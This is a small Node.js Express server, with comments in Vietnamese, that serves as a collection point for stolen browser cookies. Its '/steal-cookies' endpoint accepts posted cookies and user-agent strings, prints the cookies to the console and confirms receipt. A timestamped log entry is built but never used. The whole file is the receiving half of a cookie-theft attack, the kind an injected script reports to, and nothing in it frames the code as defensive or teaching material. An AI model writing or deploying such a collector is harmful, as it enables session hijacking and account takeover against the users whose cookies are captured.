const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const app = express();

// Middleware
app.use(
  cors({
    origin: 'http://localhost:3000',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    credentials: true,
  })
);
app.use(express.json());
app.use(cookieParser());

// Endpoint để nhận và lưu cookies
app.post('/steal-cookies', (req, res) => {
  const { cookies, userAgent } = req.body;
  const timestamp = new Date().toISOString();

  // Tạo log entry
  const logEntry = `[${timestamp}] Cookies: ${cookies}\nUser Agent: ${userAgent}\n\n`;
  console.log(cookies);
  res.send('Cookies received');
});
const PORT = 5002;
app.listen(PORT, () => {
  console.log(`Server đang chạy trên port ${PORT}`);
});
